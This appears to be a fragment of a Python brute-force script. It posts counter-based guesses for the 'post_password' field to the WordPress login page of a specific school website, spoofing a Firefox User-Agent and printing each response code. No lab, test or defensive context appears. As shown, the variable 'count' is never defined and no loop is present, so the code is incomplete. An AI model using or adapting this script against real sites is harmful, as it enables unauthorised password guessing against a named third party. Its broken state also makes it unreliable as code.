import requests

endpoint = 'https://concordacademy.org/wp-login.php'

data = {
    'post_password': str(count),
    'et_divi_submit_button': ''
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0'
}

a = requests.post(endpoint, data=data, headers=headers).status_code

print(f'Requests Sent : {a}, {count}')